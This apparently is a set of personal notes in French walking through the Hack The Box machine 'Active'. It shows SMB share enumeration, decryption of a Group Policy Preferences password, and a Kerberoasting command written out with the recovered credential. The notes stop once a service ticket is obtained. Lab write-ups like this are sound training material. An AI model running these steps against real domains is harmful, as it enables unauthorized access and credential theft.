On fait un scan nmap:

nmap -A active.htb -T5
nmap -Pn -p- active.htb -T5

On voit plein de port, pas de panique

Le premier service a verifier c est le smb (server message block):

On fait `smbclient -L //10.10.10.100 --no-pass`


-smbclient est un outil linux, qui agit comme un client SMB
-L veut dire: List shares
-//10.10.10.100 la cible
- --no-pass essaie la connexion sans mot de passe

Ca va nous afficher les ressources, sur le smb, quand il y a `$` c est accessible que par l'administrateur

On check ensuite si on acces au ressources:
`smbclient //10.10.10.100/Users --no-pass`
`smbclient //10.10.10.100/Replication --no-pass`


Ensuite un `dir` pour voir ce qu'il y a dans le repertoire

On voit les fichiers, policies, scripts,DfsrPrivate, on imagine alors qu'on est dans le fichier sysvol d'un Domain Controller

On peut alors ce dire que policies contient les GPO, scripts les scripts exécutées automatiquement.

Historiquement dans les gpp on pouvait trouver des fichiers xml types: groups.xml qui contient les mdp chiffres, sauf que la clé de chiffrement et la meme que la clé de déchiffrement


ON fait alors un `find . -name *.xml`
. : commence la recherche ici

-name : cherche par nom de fichier

*.xml : tous les fichiers qui finissent par xml

On trouve bien un groups.xml, dedans il y a : le nom d 'utilisateur et le mdp

On peut alors utilisée l'outil gpp-decrypt pour decoder le mot de passe
On le trouve

On tente alors un psexec.py svc_tgs@active.htb, mais ca ne marche pas

On tente aussi : `evil-winrm -i active.htb -u svc_tgs`


On se penche sur du kerberoasting:

On essaye d'identifier si on a des comptes utilisateurs dans l'environnement active directory, qui ont l'attribut service principale name(SPN) 

Si c est mal fait, on peut demander des tickets TGS au kdc, puis par la suite on crack le TGS avec le mot de passe de l'utilisateur

On utilise GetUserSPN.py -dc-ip active.htb active.htb/svc_tgs

Ensuite on demande le tgs avec GetUserSPNs.py active.htb/svc_tgs:'GPPstillStanfingStrong2k18'  -dc-ip 10.10.10.100 -request

On obtient le tgs
















